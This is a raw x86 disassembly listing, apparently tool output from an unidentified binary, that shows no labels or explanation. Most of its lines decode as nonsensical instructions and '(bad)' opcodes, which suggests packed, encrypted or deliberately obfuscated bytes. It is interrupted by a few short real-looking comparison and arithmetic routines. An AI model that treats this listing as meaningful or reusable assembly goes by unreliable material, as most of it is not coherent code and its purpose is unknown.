  410b1c:	ds loope 0x410b7a
  410b1f:	fnsave [ecx+0x3ca46f0f]
  410b25:	shr    al,cl
  410b27:	adc    eax,0xdc709508
  410b2c:	out    0x9e,al
  410b2e:	sar    DWORD PTR [edx-0x48],1
  410b31:	mov    ds:0x354d9d30,al
  410b36:	add    al,0x19
  410b38:	js     0x410b79
  410b3a:	adc    bh,BYTE PTR [edi]
  410b3c:	in     eax,0xac
  410b3e:	mov    ch,0xc8
  410b40:	nop
  410b41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b42:	enter  0xa393,0x45
  410b46:	shl    BYTE PTR [esi-0x71327af8],cl
  410b4c:	idiv   DWORD PTR [ebx]
  410b4e:	je     0x410b15
  410b50:	push   edx
  410b51:	out    0xbc,al
  410b53:	div    DWORD PTR [eax]
  410b55:	dec    ebx
  410b56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b57:	push   0x6f
  410b59:	retf   0x6a11
  410b5c:	cmp    ebp,DWORD PTR [edi]
  410b5e:	imul   DWORD PTR [ecx+0x2b]
  410b61:	add    BYTE PTR [esi+0x2a06868e],bl
  410b67:	fwait
  410b68:	sbb    eax,0x86212860
  410b6d:	sbb    BYTE PTR [ebx+0x17],ah
  410b70:	retf   
  410b71:	jmp    0x410b03
  410b73:	jno    0x410b42
  410b75:	mov    al,ds:0xa11efc1d
  410b7a:	dec    edx
  410b7b:	push   edx
  410b7c:	int    0x16
  410b7e:	jmp    0x7f21:0xc83c7f0d
  410b85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b86:	fcomp  QWORD PTR [ebp-0x23f1b10]
  410b8c:	or     eax,0x457f60c0
  410b91:	ins    DWORD PTR es:[edi],dx
  410b92:	shr    cl,1
  410b94:	xor    al,0x92
  410b96:	pop    esp
  410b97:	jne    0x410bf5
  410b99:	xchg   edx,eax
  410b9a:	or     cl,BYTE PTR [edi]
  410b9c:	pop    ss
  410b9d:	dec    eax
  410b9e:	push   edx
  410b9f:	(bad)  
  410ba0:	jmp    0x410b6a
  410ba2:	sub    eax,0xb47964b9
  410ba7:	xchg   edi,eax
  410ba8:	test   al,0x75
  410baa:	mov    al,0xc6
  410bac:	ror    DWORD PTR [ecx],0xfc
  410baf:	fadd   st,st(6)
  410bb1:	jae    0x410b4e
  410bb3:	mov    WORD PTR gs:[ecx+eiz*4],?
  410bb7:	clc    
  410bb8:	xchg   ebx,eax
  410bb9:	addr16 add al,0x49
  410bbc:	mov    ds:0xb8314281,eax
  410bc1:	jne    0x410c0f
  410bc3:	in     al,0x87
  410bc5:	ins    BYTE PTR es:[edi],dx
  410bc6:	jbe    0x410b48
  410bc8:	adc    eax,0xc8be27ee
  410bcd:	test   al,0x4d
  410bcf:	jmp    0x410ba6
  410bd1:	lods   al,BYTE PTR ds:[esi]
  410bd2:	scas   eax,DWORD PTR es:[edi]
  410bd3:	popf   
  410bd4:	xor    eax,0x9343f273
  410bd9:	fdivr  QWORD PTR [ecx-0x5a]
  410bdc:	push   esp
  410bdd:	mov    al,BYTE PTR [esi]
  410bdf:	out    dx,eax
  410be0:	or     DWORD PTR [ebp+0x53],eax
  410be3:	xchg   ebp,eax
  410be4:	aam    0xe5
  410be6:	push   edx
  410be7:	add    edx,DWORD PTR [eax+0x22db6902]
  410bed:	(bad)  
  410bee:	jmp    0xa88b92cd
  410bf3:	rcr    esp,cl
  410bf5:	jge    0x410bd7
  410bf7:	scas   eax,DWORD PTR es:[edi]
  410bf8:	jae    0x410be5
  410bfa:	xor    dh,BYTE PTR [ebx]
  410bfc:	mov    DWORD PTR [edx-0x32],0xd3fa3967
  410c03:	pop    ds
  410c04:	pop    ss
  410c05:	out    dx,eax
  410c06:	pop    eax
  410c07:	jmp    0x410c1e
  410c09:	fild   DWORD PTR [edi]
  410c0b:	xchg   ebx,eax
  410c0c:	das    
  410c0d:	sub    eax,DWORD PTR [esi]
  410c0f:	and    dh,BYTE PTR [eax+0x57]
  410c12:	inc    BYTE PTR ds:0xb21c4344
  410c18:	dec    ecx
  410c19:	dec    ebp
  410c1a:	adc    dl,dl
  410c1c:	xor    esp,0x36
  410c1f:	mov    dl,dh
  410c21:	int    0xad
  410c23:	mov    ecx,0xd0afd00a
  410c28:	or     al,0x26
  410c2a:	fstp   DWORD PTR [ebx+esi*2+0x7359d33b]
  410c31:	sbb    BYTE PTR [edi+edx*4-0x7426a3ea],bh
  410c38:	ret    0x86dc
  410c3b:	inc    esi
  410c3c:	or     DWORD PTR [esi-0x5d0b8125],esi
  410c42:	fsub   st(3),st
  410c44:	int3   
  410c45:	push   es
  410c46:	mov    eax,0xee5afc8f
  410c4b:	jb     0x410c87
  410c4d:	sub    eax,0x7ff4a293
  410c52:	outs   dx,BYTE PTR ds:[esi]
  410c53:	imul   ecx,DWORD PTR [eax],0xffffff9b
  410c56:	push   cs
  410c57:	jne    0x410c3c
  410c59:	setno  BYTE PTR [eax+0x6eba5c2b]
  410c60:	adc    bl,BYTE PTR [ecx]
  410c62:	mov    dl,0x79
  410c64:	mov    DWORD PTR [eax-0x15fad802],0xa228dc92
  410c6e:	sbb    dl,dl
  410c70:	cmc    
  410c71:	adc    al,0x5a
  410c73:	cdq    
  410c74:	push   ss
  410c75:	xor    esp,ecx
  410c77:	xor    ah,ch
  410c79:	and    BYTE PTR [esi+0x6fcfe10e],al
  410c7f:	popa   
  410c80:	adc    al,dl
  410c82:	imul   edx,DWORD PTR [ebp+eiz*4-0x56],0xc37ba4d2
  410c8a:	call   DWORD PTR [edi-0x5d7f9db7]
  410c90:	in     al,0xcd
  410c92:	jbe    0x410cc2
  410c94:	aas    
  410c95:	sbb    al,BYTE PTR [eax+eax*4]
  410c98:	gs xchg ecx,eax
  410c9a:	mov    esp,0x44a3f6bb
  410c9f:	dec    ebp
  410ca1:	shl    BYTE PTR [esi],0xd2
  410ca4:	xchg   DWORD PTR [ebx+0x586fc3ee],ebp
  410caa:	push   ds
  410cab:	pop    ebp
  410cac:	push   edi
  410cad:	mov    esp,DWORD PTR [esi-0x496657a7]
  410cb3:	push   ds
  410cb4:	mov    ch,0x45
  410cb6:	mov    esi,0x49266c6e
  410cbb:	vmulps xmm6,xmm5,XMMWORD PTR [edx]
  410cbf:	mov    eax,ds:0x5bd55e11
  410cc4:	sub    bl,ah
  410cc6:	popf   
  410cc7:	(bad)
  410cca:	mov    ds:0xc61f0497,eax
  410ccf:	or     DWORD PTR [ecx],ebx
  410cd1:	fnsave [edx-0x47d9867d]
  410cd7:	push   0x72
  410cd9:	popf   
  410cda:	xchg   ecx,eax
  410cdb:	repz bound esi,QWORD PTR [ebx+0x12]
  410cdf:	push   ss
  410ce0:	inc    ebx
  410ce1:	mov    ch,0x1e
  410ce3:	jge    0x410cf2
  410ce5:	dec    edx
  410ce6:	push   0x48
  410ce8:	out    0xde,al
  410cea:	cs fwait
  410cec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ced:	mov    edi,0xa528a4de
  410cf2:	push   esp
  410cf3:	ss jne 0x410ca0
  410cf6:	ret    
  410cf7:	sahf   
  410cf8:	repnz retf 0xb71d
  410cfc:	push   esp
  410cfd:	sbb    ebx,ebx
  410cff:	(bad)  
  410d00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d01:	and    edx,DWORD PTR [edx+0x5a]
  410d04:	and    esp,DWORD PTR [ecx+0x2c]
  410d07:	aam    0x4a
  410d09:	mov    ebp,0x2892f9b
  410d0e:	mov    eax,DWORD PTR [ebp-0x8]
  410d11:	jmp    0x410fdf
  410d16:	je     0x410d40
  410d18:	(bad)  
  410d19:	push   cs
  410d1a:	push   edx
  410d1b:	lock je 0x410d8e
  410d1e:	outs   dx,BYTE PTR ds:[esi]
  410d1f:	dec    ecx
  410d20:	mov    edi,0x3d9f599c
  410d25:	adc    eax,0x7e7eb8eb
  410d2a:	scas   eax,DWORD PTR es:[edi]
  410d2b:	jl     0x410dab
  410d2d:	jle    0x410d46
  410d2f:	xor    edi,ebx
  410d31:	lea    eax,ds:[esi+ebx*2-0x39903cc1]
  410d39:	dec    eax
  410d3a:	data16 sbb ch,BYTE PTR [ebx]
  410d3d:	mov    bl,0x7c
  410d3f:	cmp    al,BYTE PTR [eax-0x7a323475]
  410d45:	add    BYTE PTR [eax-0x367fc46a],al
  410d4b:	jle    0x410d3d
  410d4d:	mov    WORD PTR [ebp-0x6d],ds
  410d50:	add    al,0xe8
  410d52:	pushf  
  410d53:	imul   edx,DWORD PTR [esi-0x224af44a],0xffffff86
  410d5a:	mov    eax,0x4b069710
  410d5f:	in     eax,0xad
  410d61:	xchg   esi,eax
  410d62:	stos   DWORD PTR es:[edi],eax
  410d63:	into   
  410d64:	loop   0x410d85
  410d66:	and    ebp,DWORD PTR [esi-0x23]
  410d69:	je     0x410d91
  410d6b:	test   DWORD PTR [esi+0x6e8b810d],esp
  410d71:	lock inc edx
  410d73:	fild   WORD PTR [edx-0x80]
  410d76:	mov    esi,DWORD PTR [esi+ecx*8-0x574b8558]
  410d7d:	mov    al,ds:0xb3783069
  410d82:	mov    dl,0xfe
  410d84:	sub    eax,0xa1c06014
  410d89:	mov    bh,0xee
  410d8b:	cdq    
  410d8c:	imul   esp,ecx,0xffffffee
  410d8f:	fld    TBYTE PTR ds:0xf47e9bb9
  410d95:	add    al,0xe8
  410d97:	push   0x3c
  410d99:	imul   ebx,DWORD PTR [ebp+0x4a36f2bb],0xfffffff8
  410da0:	jbe    0x410d45
  410da2:	sub    ch,al
  410da4:	sti    
  410da5:	repnz xchg esi,eax
  410da7:	mov    dl,0xf8
  410da9:	adc    al,0xf9
  410dab:	rcl    DWORD PTR [eax-0x1c2d1b2e],1
  410db1:	adc    edx,DWORD PTR [ebx+0x4e]
  410db4:	xchg   BYTE PTR [edx],ah
  410db6:	xchg   esp,eax
  410db7:	lahf   
  410db8:	or     al,0x21
  410dba:	nop
  410dbb:	inc    edx
  410dbc:	cmc    
  410dbd:	sbb    eax,0xfbff5f0d
  410dc2:	ret    0xf7d8
  410dc5:	int3   
  410dc6:	jg     0x3d7ebd66
  410dcc:	dec    ecx
  410dcd:	cli    
  410dce:	xchg   ebp,eax
  410dcf:	mov    dl,BYTE PTR [ecx]
  410dd1:	or     esi,DWORD PTR [ebp-0x20]
  410dd4:	or     ah,bh
  410dd6:	and    bh,BYTE PTR [ebx+0x58]
  410dd9:	mov    ds:0xa39906d8,al
  410dde:	or     ah,ch
  410de0:	add    al,0x46
  410de2:	sub    eax,0x64067ff8
  410de7:	sbb    BYTE PTR [ecx-0x1b260726],dl
  410ded:	cmp    edi,ecx
  410def:	jmp    0xaea1:0x9c7b68e0
  410df6:	cli    
  410df7:	gs dec esp
  410df9:	pop    esi
  410dfa:	ret    
  410dfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410dfc:	jp     0x410e4f
  410dfe:	xchg   ebx,eax
  410dff:	scas   al,BYTE PTR es:[edi]
  410e00:	inc    esi
  410e01:	sti    
  410e02:	and    ah,dl
  410e04:	mov    ebp,0xfc216162
  410e09:	cmp    DWORD PTR [edx-0x2bb0019d],esp
  410e0f:	push   esp
  410e10:	(bad)  
  410e11:	sti    
  410e12:	push   ds
  410e13:	mov    ds:0x53442d49,eax
  410e18:	pop    esp
  410e19:	scas   eax,DWORD PTR es:[edi]
  410e1a:	add    DWORD PTR [ecx],ebp
  410e1c:	test   DWORD PTR [eax-0x7],ebx
  410e1f:	lods   eax,DWORD PTR ds:[si]
  410e21:	mov    al,0x3d
  410e23:	pop    es
  410e24:	mov    dh,0x9a
  410e26:	sbb    DWORD PTR [eax+0x5fea7372],ecx
  410e2c:	and    edx,ecx
  410e2e:	ss js  0x410dea
  410e31:	jo     0x410db4
  410e33:	xor    DWORD PTR gs:[eax-0x2933c7a],ebp
  410e3a:	inc    edi
  410e3b:	add    BYTE PTR [edi+0x56db9f6f],0x65
  410e42:	or     al,0x2c
  410e44:	inc    ebp
  410e45:	jp     0x410ddd
  410e47:	sbb    dh,ah
  410e49:	gs cs sbb ah,0x5d
  410e4e:	or     ebp,ebp
  410e50:	js     0x410de2
  410e52:	sahf   
  410e53:	push   ebp
  410e54:	pop    edi
  410e55:	mov    esp,0x84ef7b7c
  410e5a:	or     DWORD PTR [edi+0x76],ebx
  410e5d:	sti    
  410e5e:	pushf  
  410e5f:	icebp  
  410e60:	mov    dh,BYTE PTR [ecx+0x1743fe34]
  410e66:	jmp    0x410e8e
  410e68:	push   edx
  410e69:	add    DWORD PTR [edx+0x6bb6f6a5],edx
  410e6f:	fcmovnb st,st(0)
  410e71:	inc    ecx
  410e72:	rcl    DWORD PTR [edx+0x2ca23b82],cl
  410e78:	push   es
  410e79:	ret    0xcec7
  410e7c:	mov    bl,0x56
  410e7e:	xchg   edx,eax
  410e7f:	stos   DWORD PTR es:[edi],eax
  410e80:	add    eax,0xedf0aa0a
  410e85:	dec    eax
  410e86:	daa    
  410e87:	jns    0x410e5b
  410e89:	outs   dx,BYTE PTR ds:[esi]
  410e8a:	scas   eax,DWORD PTR es:[edi]
  410e8b:	and    eax,0xc2ae7670
  410e90:	std    
  410e91:	dec    ebx
  410e92:	xor    eax,0xef981636
  410e97:	mov    ah,BYTE PTR [esi-0x1c]
  410e9a:	push   esi
  410e9b:	adc    eax,0x1eae1cfd
  410ea0:	popa   
  410ea1:	inc    ebp
  410ea2:	retf   
  410ea3:	ja     0x410e2d
  410ea5:	ss aaa 
  410ea7:	mov    esp,0x597143d
  410eac:	jmp    0xfd7e:0x411fb0e1
  410eb3:	in     al,dx
  410eb4:	jl     0x410f31
  410eb6:	inc    edx
  410eb7:	clc    
  410eb8:	cmp    al,0x9
  410eba:	adc    al,0x73
  410ebc:	sbb    al,0x7d
  410ebe:	sbb    BYTE PTR [ebx-0x68b11428],dl
  410ec4:	xor    cl,BYTE PTR [ebx]
  410ec6:	mov    bh,0x78
  410ec8:	enter  0xdd40,0x49
  410ecc:	shl    DWORD PTR [ebp+ebx*4-0x4a],0xa0
  410ed1:	xlat   BYTE PTR ds:[ebx]
  410ed2:	dec    eax
  410ed3:	push   ebp
  410ed4:	pop    eax
  410ed5:	sub    bl,al
  410ed7:	lods   al,BYTE PTR ds:[esi]
  410ed8:	mov    eax,0x46a6a79d
  410edd:	and    al,0x38
  410edf:	mov    ebx,0x8c979bbc
  410ee4:	and    al,0x4f
  410ee6:	in     al,0xc0
  410ee8:	xor    ah,BYTE PTR [ebx+edi*4-0x17]
  410eec:	rcr    DWORD PTR [ebx],1
  410eee:	sahf   
  410eef:	test   BYTE PTR [ebp-0x16],0xdd
  410ef3:	sub    al,0x85
  410ef5:	ja     0x410f65
  410ef7:	push   edx
  410ef8:	jae    0x410e98
  410efa:	icebp  
  410efb:	cmp    BYTE PTR [ecx-0x60],bl
  410efe:	fs sbb al,0xad
  410f01:	add    esi,esi
  410f03:	jle    0x410f4f
  410f05:	enter  0x2650,0xf6
  410f09:	xchg   esi,eax
  410f0a:	add    eax,0x8eab8f1d
  410f0f:	test   al,0xad
  410f11:	sbb    BYTE PTR [ebx-0x46bcff25],ch
  410f17:	cmp    dh,ah
  410f19:	mov    esi,0x32b9eae8
  410f1e:	fbld   TBYTE PTR [ecx]
  410f20:	xchg   ebx,eax
  410f21:	push   es
  410f22:	ins    DWORD PTR es:[edi],dx
  410f23:	inc    esi
  410f24:	adc    ecx,esi
  410f26:	xchg   ecx,eax
  410f27:	call   0x7965:0x98d7b6bf
  410f2e:	pushaw 
  410f30:	mov    DWORD PTR [eax-0x7634876],ebp
  410f36:	mov    eax,0x6eb3af9
  410f3b:	gs jle 0x410f64
  410f3e:	jle    0x410f86
  410f40:	jle    0x410f9c
  410f42:	popa   
  410f43:	aam    0xa9
  410f45:	xchg   esp,eax
  410f47:	lods   eax,DWORD PTR ds:[esi]
  410f48:	add    al,BYTE PTR [eax-0x39d7f894]
  410f4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f4f:	mov    ebx,0x4880db93
  410f54:	mov    cl,ch
  410f56:	inc    ebx
  410f57:	mov    eax,ds:0x9e5912bd
  410f5c:	fistp  DWORD PTR [eax-0x28]
  410f5f:	loop   0x410f12
  410f61:	jl     0x410f19
  410f63:	xor    ah,BYTE PTR [eax]
  410f65:	add    DWORD PTR [esi-0x4],ebx
  410f68:	adc    ch,bh
  410f6a:	mov    dh,0x4c
  410f6c:	imul   edx,DWORD PTR [edi],0x22
  410f6f:	and    eax,esi
  410f71:	fild   WORD PTR [ebp+edi*1-0x9ee3196]
  410f78:	shl    edi,cl
  410f7a:	jno    0x410fcd
  410f7c:	pop    ecx
  410f7d:	in     al,dx
  410f7e:	mov    eax,ds:0xd43c1eaf
  410f83:	mov    ah,0xaf
  410f85:	pushf  
  410f86:	mov    ds:0x6d752a9e,al
  410f8b:	pusha  
  410f8c:	int3   
  410f8d:	test   al,0x45
  410f8f:	test   DWORD PTR [ecx+0xc],ebp
  410f92:	or     DWORD PTR [ecx],0x48141160
  410f98:	sbb    DWORD PTR [eax],0xcf3c8a1f
  410f9e:	(bad)  
  410f9f:	int3   
  410fa0:	push   ebp
  410fa1:	mov    al,0xa8
  410fa3:	mov    dh,0x76
  410fa5:	je     0x410fd1
  410fa7:	or     DWORD PTR [edx+eiz*8-0x70],esi
  410fab:	mov    ah,0x79
  410fad:	xchg   edi,eax
  410fae:	(bad)
  410fb1:	jno    0x410fdd
  410fb3:	test   DWORD PTR [esi+0x5560445e],esp
  410fb9:	data16 (bad) 
  410fbb:	out    0x4,al
  410fbd:	cmp    DWORD PTR [esi-0x4c],eax
  410fc0:	or     eax,edx
  410fc2:	sub    ebx,ebx
  410fc4:	mov    al,0xc5
  410fc6:	repnz nop
  410fc8:	in     eax,dx
  410fc9:	in     al,dx
  410fca:	fldcw  WORD PTR [ecx+0x625eaf94]
  410fd0:	into   
  410fd1:	hlt    
  410fd2:	mov    edx,edi
  410fd4:	inc    edx
  410fd5:	cmp    edi,edx
  410fd7:	sub    eax,0x1eaf08cc
  410fdc:	clc    
  410fdd:	int    0x3a
  410fdf:	xor    eax,ecx
  410fe1:	add    eax,esi
  410fe3:	mov    DWORD PTR [ebp+0x8],eax
  410fe6:	mov    eax,DWORD PTR [ebp+0x8]
  410fe9:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fed:	mov    dl,BYTE PTR [ebp-0x1]
  410ff0:	cmp    al,dl
  410ff2:	je     0x411303
  410ff8:	mov    eax,DWORD PTR [ebp+0x8]
  410ffb:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fff:	mov    edx,DWORD PTR [ebp+0xc]
  411002:	cmp    al,BYTE PTR [edx]
  411004:	jne    0x4115f7
  41100a:	mov    eax,DWORD PTR [ebp-0x8]
  41100d:	mov    edx,DWORD PTR [ebp+0xc]
  411010:	movsx  edx,BYTE PTR [edx]
  411013:	xor    eax,ecx
  411015:	add    eax,esi
  411017:	cmp    edx,eax
  411019:	jmp    0x4112e7
  41101e:	jmp    0x411054
  411020:	push   esp
  411021:	dec    ebx
  411022:	push   ecx
  411023:	imul   esi,ecx,0xffffffb4
  411026:	and    DWORD PTR [edx-0x16],esi
  411029:	loope  0x410ffd
  41102b:	dec    edx
  41102c:	mov    edi,esp
  41102e:	sbb    BYTE PTR [edi+0x7e],al
  411031:	jle    0x410fe2
  411033:	jl     0x4110b3
  411035:	jle    0x411084
  411037:	aas    
  411038:	cwde   
  411039:	sub    BYTE PTR [edi-0x64ef6e29],bh
  41103f:	aam    0x5f
  411041:	and    dh,cl
  411043:	ja     0x41103e
  411045:	test   cl,ah
  411047:	pushf  
  411048:	xchg   edx,eax
  411049:	jno    0x410fee
  41104b:	imul   esp,DWORD PTR [edi],0xffffffe8
  41104e:	adc    cl,BYTE PTR [eax-0x7094e5f4]
  411054:	aam    0x44
  411056:	mov    ebx,edx
  411058:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41105a:	(bad)  
  41105b:	idiv   BYTE PTR [edi+ebx*8+0x6aa86bd9]
  411062:	sub    BYTE PTR [eax],cl
  411064:	xor    eax,0xcfb767aa
  411069:	mov    eax,ds:0x14f831c3
  41106e:	pop    edi
  41106f:	ret    
  411070:	rol    BYTE PTR [ebp+eax*2+0x3180b67a],cl
  411077:	sub    ch,BYTE PTR [esi-0x1be4bcf8]
  41107d:	push   ss
  41107e:	add    eax,0xd3b372c3
  411083:	rcl    DWORD PTR [eax+0x761385dd],1
  411089:	adc    esi,DWORD PTR [edi-0x36]
  41108c:	sub    ebp,DWORD PTR [esi-0x8]
  41108f:	jmp    0x48c3:0x354b47aa
  411096:	mov    ds:0x1242a043,eax
  41109b:	mov    dl,0xb5
  41109d:	popa   
  41109e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41109f:	and    ebx,DWORD PTR [ebp+0x10]
  4110a2:	fwait
  4110a3:	xchg   ebx,eax
  4110a4:	retf   
  4110a5:	xchg   edx,eax
  4110a6:	adc    eax,0xdf026abe
  4110ab:	jmp    0x1d12:0x428641c3
  4110b2:	scas   eax,DWORD PTR es:[edi]
  4110b3:	leave  
  4110b4:	sub    BYTE PTR [esp+ebp*1+0x69],0xb1
  4110b9:	add    dl,BYTE PTR [ebx+0x3dcb60aa]
  4110bf:	push   ebp
  4110c0:	xor    DWORD PTR [eax-0x67],eax
  4110c3:	fild   QWORD PTR [ebx]
  4110c5:	push   ebp
  4110c6:	jb     0x411108
  4110c8:	cmp    BYTE PTR [ecx-0x6303a9c4],dl
  4110ce:	jge    0x4110b2
  4110d0:	shl    BYTE PTR [esi],0x3b
  4110d3:	dec    ebx
  4110d4:	int3   
  4110d5:	cmp    esi,DWORD PTR [ebx]
  4110d7:	lds    esi,FWORD PTR [edx]
  4110d9:	jae    0x4110cb
  4110db:	inc    edx
  4110dc:	xchg   ebx,eax
  4110dd:	sub    ah,cl
  4110df:	push   0x33
  4110e1:	jns    0x411081
  4110e3:	(bad)  
  4110e5:	pusha  
  4110e6:	or     dl,BYTE PTR [ecx]
  4110e8:	pop    edx
  4110e9:	xor    ebx,ebp
  4110eb:	push   eax
  4110ec:	lea    ebp,[edx+0x26]
  4110ef:	jns    0x4110f8
  4110f1:	sub    eax,0x7cbeaa4e
  4110f6:	js     0x411098
  4110f8:	arpl   WORD PTR [ebx-0x2c],ax
  4110fb:	mov    bl,BYTE PTR [esi-0x70]
  4110fe:	jbe    0x411130
  411100:	add    ebp,DWORD PTR [esi+0x75]
  411103:	and    BYTE PTR [esi],0xb9
  411106:	mov    al,ds:0xd8677653
  41110b:	adc    edi,0x3ea2fc56
  411111:	xchg   esi,eax
  411112:	cmp    ebx,DWORD PTR [edx]
  411114:	lods   al,BYTE PTR ds:[esi]
  411115:	ror    bh,cl
  411117:	mov    ds:0xceae3c4b,al
  41111c:	lock cmp BYTE PTR [eiz*2+0x1f988877],ah
  411124:	std    
  411125:	jb     0x4111a5
  411127:	cld    
  411128:	mov    ds:0x48307c7e,al
  41112d:	shl    edx,1
  41112f:	mov    bl,0x3
  411131:	inc    esi
  411133:	pop    eax
  411134:	cli    
  411135:	dec    DWORD PTR [ebp+0x41]
  411138:	stc    
  411139:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41113a:	imul   ebx,DWORD PTR [eax],0xd44fef7f
  411140:	xchg   edi,eax
  411141:	es call 0x7932:0xce7ae6f1
  411149:	sub    DWORD PTR [eax-0x4e],0xffffffd6
  41114d:	rol    BYTE PTR [edx-0x7c],cl
  411150:	mov    dl,0x11
  411152:	add    al,0x98
  411154:	repnz or al,bl
  411157:	mov    ch,0x4a
  411159:	mov    edx,0x5c1e75f3
  41115e:	jl     0x4111b0
  411160:	fisttp DWORD PTR [edi+eiz*4]
  411163:	sbb    dl,BYTE PTR [ebx-0x1091d8bf]
  411169:	push   ds
  41116a:	in     al,dx
  41116b:	icebp  
  41116c:	jle    0x4111bc
  41116e:	test   eax,0x2796b282
  411173:	add    eax,0x76f6f9f3
  411178:	xor    eax,0x765e3b96
  41117d:	fnstenv [ecx]
  41117f:	jmp    0x41116d
  411181:	mov    esi,0x9040aa44
  411186:	jmp    0x18ee:0x26aff8bb
  41118d:	ret    
  41118e:	fnstsw WORD PTR [ecx+0x30]
  411191:	daa    
  411192:	push   eax
  411193:	push   esi
  411194:	iret   
  411195:	(bad)  
  411196:	dec    edx
  411197:	(bad)  
  411199:	sbb    eax,0x6723d888
  41119e:	xor    cl,ch
  4111a0:	out    dx,al
  4111a1:	mov    edx,0xb88f0324
  4111a6:	and    ch,al
  4111a8:	das    
  4111a9:	(bad)  
  4111aa:	lds    ecx,FWORD PTR [edi]
  4111ac:	(bad)  
  4111ad:	les    edi,FWORD PTR [esi+esi*4]
  4111b0:	fwait
  4111b1:	push   edx
  4111b2:	dec    esi
  4111b3:	inc    esp
  4111b4:	or     DWORD PTR [edi-0x52923ebd],ebp
  4111ba:	pop    es
  4111bb:	push   esi
  4111bc:	adc    eax,0x946cc48f
  4111c1:	pop    esp
  4111c2:	xchg   BYTE PTR [eax-0x5cbe6eb],cl
  4111c8:	xchg   esi,eax
  4111c9:	push   0xeedf56c7
  4111ce:	(bad)  
  4111cf:	mov    ebx,0x83b947de
  4111d4:	enter  0x37d7,0x3
  4111d8:	cmc    
  4111d9:	add    bh,0x2a
  4111dc:	and    ecx,DWORD PTR [eax+ebp*1+0x37e40755]
  4111e3:	add    ebp,DWORD PTR [eax-0x3f]
  4111e6:	mov    dh,0x38
  4111e8:	aaa    
  4111e9:	adc    BYTE PTR [edx+0x4a],dh
  4111ec:	xor    ebp,DWORD PTR [edx-0x1f97eea2]
  4111f2:	mov    esp,0xd93efea1
  4111f7:	inc    edx
  4111f8:	jecxz  0x41126f
  4111fa:	sub    BYTE PTR [ecx*4+0x6f397714],dh
  411201:	lds    esi,FWORD PTR [esi+eiz*2-0x19a4f35e]
  411208:	mov    al,ds:0x13edec8e
  41120d:	daa    
  41120e:	pminub mm3,QWORD PTR cs:[ebx-0x5fc80604]
  411216:	adc    eax,0xaa96838b
  41121b:	lock sub al,0x73
  41121e:	jne    0x411229
  411220:	mov    WORD PTR [esi],es
  411222:	imul   esi,DWORD PTR ds:0x734b1b79,0x8527a38e
  41122c:	stos   DWORD PTR es:[edi],eax
  41122d:	push   edx
  41122e:	je     0x411251
  411230:	jno    0x41128b
  411232:	adc    eax,0x174a0e6c
  411237:	mov    es,WORD PTR [ebp+0x74]
  41123a:	fadd   DWORD PTR [ecx-0x62767fe1]
  411240:	in     al,0x10
  411242:	sbb    al,0xcc
  411244:	mov    WORD PTR [esi],es
  411246:	xchg   edx,eax
  411247:	shl    DWORD PTR [edi+0x482eb564],0xff
  41124e:	mov    ecx,0xdf07d0ae
  411253:	inc    ebp
  411254:	call   0x50cc:0xb93f439c
  41125b:	push   0xb3bb837a
  411260:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411261:	pop    edx
  411262:	call   0x57a2e6d7
  411267:	in     eax,dx
  411268:	xchg   esp,eax
  411269:	sbb    eax,0x8306c1e3
  41126e:	adc    BYTE PTR [edx],al
  411270:	dec    ebx
  411271:	inc    ebp
  411272:	adc    eax,0x74ae6639
  411277:	inc    ebp
  411278:	dec    esp
  411279:	dec    esp
  41127a:	pop    edi
  41127b:	inc    eax
  41127c:	lea    esp,[eax-0xf0a7a9b]
  411282:	mov    ds:0x66e79ae9,al
  411287:	mov    dl,0x5e
  411289:	ficom  DWORD PTR ds:0x4f5a99eb
  41128f:	mov    eax,0xf8d8d30e
  411294:	push   0x7a1719bd
  411299:	(bad)  
  41129a:	xchg   edx,eax
  41129b:	push   esi
  41129c:	pop    edi
  41129d:	jmp    0x411252
  41129f:	xchg   edi,eax
  4112a0:	fwait
  4112a1:	jge    0x4112be
  4112a3:	fmul   st,st(6)
  4112a5:	pop    ebx
  4112a6:	dec    edi
  4112a7:	mov    ecx,0x42fb47e6
  4112ac:	enter  0x2261,0x8b
  4112b0:	push   ebx
  4112b1:	pextrw eax,(bad),0xc5
  4112b3:	inc    edx
  4112b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112b5:	mov    ds:0x21cd07e,eax
  4112ba:	push   ds
  4112bb:	(bad)
  4112be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112bf:	test   BYTE PTR [ecx],bl
  4112c1:	out    dx,eax
  4112c2:	(bad)  
  4112c3:	mov    eax,0xf4ca7819
  4112c8:	dec    esi
  4112c9:	jbe    0x411309
  4112cb:	cmc    
  4112cc:	add    al,BYTE PTR [ebp-0x4e59cc0f]
  4112d2:	das    
  4112d3:	je     0x411354
  4112d5:	xchg   DWORD PTR [esi-0x7afdf752],edx
  4112db:	or     esi,DWORD PTR [ebp+0x6]
  4112de:	pop    esi
  4112df:	fcomp  DWORD PTR [ebx+0x3b7d4967]
  4112e5:	or     BYTE PTR [bx],0x84
  4112e9:	inc    BYTE PTR [edx]
  4112eb:	add    BYTE PTR [eax],al
  4112ed:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4112f4:	lea    eax,[ebp-0x18]
  4112f7:	mov    DWORD PTR [ebp-0x14],eax
  4112fa:	mov    eax,DWORD PTR [ebp-0x14]
  4112fd:	add    DWORD PTR [eax],0x705fa8f
  411303:	mov    eax,DWORD PTR [ebp-0x10]
  411306:	jmp    0x4115d4
  41130b:	sub    al,0xc2
  41130d:	or     al,0xb3
  41130f:	lock jno 0x4112c3
  411312:	inc    ecx
  411313:	mov    ds:0x4e68f61e,eax
  411318:	or     eax,0x45498b0f
  41131d:	jle    0x41139d
  41131f:	scas   eax,DWORD PTR es:[edi]
  411320:	jl     0x4113a0
  411322:	jle    0x4112ea
  411324:	inc    edi
  411325:	cdq    
